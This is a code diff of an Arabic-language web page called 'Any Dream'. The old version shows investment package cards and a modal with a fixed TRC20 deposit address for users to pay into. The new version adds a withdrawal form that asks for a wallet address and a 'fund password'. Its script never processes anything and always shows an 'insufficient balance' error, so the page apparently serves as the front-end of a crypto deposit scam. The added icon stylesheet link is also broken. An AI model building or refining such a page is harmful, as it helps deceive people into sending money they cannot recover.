@@ -1,128 +1,77 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-
 <head>
-
-<meta charset="UTF-8">
-
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
-
-<title>Any Dream</title>
-
-<link rel="stylesheet" href="home.css">
-
-<link rel="stylesheet"
-href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
-
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Any Dream</title>
+  <link rel="stylesheet" href="home.css">
+  <!-- مكتبة الأيقونات الاحترافية -->
+  <link rel="stylesheet" href="https://cloudflare.com">
 </head>
-
 <body>
 
-<div class="app">
+<div class="withdraw-page-container">
+  <!-- بطاقة الرصيد البيضاء الاحترافية -->
+  <div class="balance-card">
+    <span class="balance-label">إجمالي الرصيد المقدر</span>
+    <h2 class="balance-amount">0.00 <span class="currency">USDT</span></h2>
+  </div>
 
-<header class="header">
+  <!-- نموذج طلب السحب -->
+  <form id="withdrawForm" class="withdraw-form" onsubmit="event.preventDefault();">
+    
+    <!-- حقل اختيار الشبكة -->
+    <div class="form-group">
+      <label class="group-label">الشبكة</label>
+      <select class="styled-input" id="networkSelect" required>
+        <option value="TRC20">TRC20</option>
+      </select>
+    </div>
 
-<h2>Any Dream</h2>
+    <!-- حقل عنوان المحفظة -->
+    <div class="form-group">
+      <label class="group-label">عنوان المحفظة</label>
+      <input type="text" class="styled-input" id="walletAddress" placeholder="أدخل عنوان محفظة TRC20" required>
+    </div>
 
+    <!-- حقل كلمة المرور -->
+    <div class="form-group">
+      <label class="group-label">كلمة مرور الصندوق</label>
+      <input type="password" class="styled-input" id="fundPassword" placeholder="أدخل كلمة مرور السحب" required>
+    </div>
 
+    <!-- رسالة الخطأ المخفية بحركة احترافية -->
+    <div id="errorMessage" class="error-toast-message">
+      <i class="fas fa-exclamation-circle"></i> عذراً، رصيدك الحالي غير كافٍ لإتمام عملية السحب.
+    </div>
 
-</header>
-
-<section class="packages">
-
-<div class="card" onclick="openWallet()">
-
-<img src="h1.png">
-
+    <!-- زر السحب الأخضر -->
+    <button type="button" onclick="handleWithdraw()" class="withdraw-submit-btn">سحب الأموال</button>
+  </form>
 </div>
 
-<div class="card" onclick="openWallet()">
+<!-- كود التشغيل والتحقق البرمجي للزر والرسالة -->
+<script>
+function handleWithdraw() {
+  const address = document.getElementById('walletAddress').value.trim();
+  const password = document.getElementById('fundPassword').value.trim();
+  const errorDiv = document.getElementById('errorMessage');
 
-<img src="h2.png">
+  // التحقق من ملء البيانات
+  if (address === "" || password === "") {
+      alert("يرجى ملء جميع الحقول المطلوبة أولاً.");
+      return;
+  }
 
-</div>
-
-<div class="card" onclick="openWallet()">
-
-<img src="h3.png">
-
-</div>
-
-<div class="card" onclick="openWallet()">
-
-<img src="h4.png">
-
-</div>
-
-</section>
-
-<div id="wallet" class="wallet">
-
-<div class="wallet-box">
-
-<h2>محفظة TRC20</h2>
-
-<p>قم بالتحويل إلى العنوان التالي</p>
-
-<input
-id="walletAddress"
-readonly
-value="THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP">
-
-<button onclick="copyWallet()">
-
-نسخ العنوان
-
-</button>
-
-<button onclick="closeWallet()">
-
-إغلاق
-
-</button>
-
-</div>
-
-</div>
-
-<nav class="bottom">
-
-<div class="item active">
-
-<i class="fa-solid fa-house"></i>
-
-<span>الرئيسية</span>
-
-</div>
-
-<div class="item">
-
-<i class="fa-solid fa-wallet"></i>
-
-<span>الأصول</span>
-
-</div>
-
-<div class="item">
-
-<i class="fa-solid fa-list-check"></i>
-
-<span>المهام</span>
-
-</div>
-
-<div class="item">
-
-<i class="fa-solid fa-user"></i>
-
-<span>حسابي</span>
-
-</div>
-
-</nav>
-
-<script src="home.js"></script>
+  // إظهار التنبيه الاحترافي
+  errorDiv.style.display = 'flex';
+  
+  // إخفاء التنبيه تلقائياً بعد 5 ثوانٍ
+  setTimeout(() => {
+      errorDiv.style.display = 'none';
+  }, 5000);
+}
+</script>
 
 </body>
-
 </html>
